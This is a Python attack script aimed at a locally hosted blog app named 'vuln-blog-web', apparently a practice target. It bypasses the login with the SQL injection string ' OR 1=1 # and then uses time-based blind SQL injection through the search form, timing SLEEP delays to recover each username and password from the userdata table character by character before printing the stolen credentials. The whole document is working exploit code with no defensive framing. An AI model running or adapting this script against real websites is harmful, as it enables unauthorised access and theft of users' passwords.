import requests
import string
from time import time

url = "http://localhost/vuln-blog-web/"

characters = string.ascii_letters + string.digits + "!@#$%^&*()"

session = requests.Session()

payload_login = {"username": "' OR 1=1 #"}
res = session.post(url+"login.php", data=payload_login)

count = 0
len_user_i = 0
j = 0
len_pw_i = 0

while True:
    
    while True:

        null_check = {"search": f"coding' AND IF(LENGTH((SELECT username FROM userdata LIMIT {j},1)) IS NULL, SLEEP(2),'a') #"}
        null_start_time = time()
        res = session.post(url, data=null_check)
        null_end_time = time()
        null_final_time = null_end_time - null_start_time
        if null_final_time >= 2:
            count = 1
            break

        length = {"search": f"coding' AND IF(LENGTH((SELECT username FROM userdata LIMIT {j},1))={len_user_i}, SLEEP(2),'a') #"}
        start_time = time()
        res = session.post(url, data=length)
        end_time = time()
        final_time = end_time - start_time
        if final_time >= 2:
            length = len_user_i
            len_user_i = 0
            break
        len_user_i += 1

    if count == 1:
        break

    username = ""
    for sub_i in range(length+1):
        for c in characters:
            payload_search = {"search": f"coding' AND IF(SUBSTRING((SELECT BINARY username FROM userdata LIMIT {j},1),{sub_i},1)='{c}', SLEEP(2),'a') #"}
            start_time = time()
            res = session.post(url, data=payload_search)
            end_time = time()
            final_time = end_time - start_time
            if final_time >= 2:
                username += c
                break
    j += 1

    while True:

        length = {"search": f"coding' AND IF(LENGTH((SELECT password FROM userdata WHERE username='{username}'))={len_pw_i}, SLEEP(2),'a') #"}
        start_time = time()
        res = session.post(url, data=length)
        end_time = time()
        final_time = end_time - start_time
        if final_time >= 2:
            length_pw = len_pw_i
            len_pw_i = 0
            break
        len_pw_i += 1
    
    password = ""
    for sub_pw_i in range(length_pw+1):
        for c in characters:
            payload_search = {"search": f"coding' AND IF(SUBSTRING((SELECT BINARY password FROM userdata WHERE username='{username}'),{sub_pw_i},1)='{c}', SLEEP(2),'a') #"}
            start_time = time()
            res = session.post(url, data=payload_search)
            end_time = time()
            final_time = end_time - start_time
            if final_time >= 2:
                password += c
                break

    print("[+] Found credentials: " + username + ":" + password)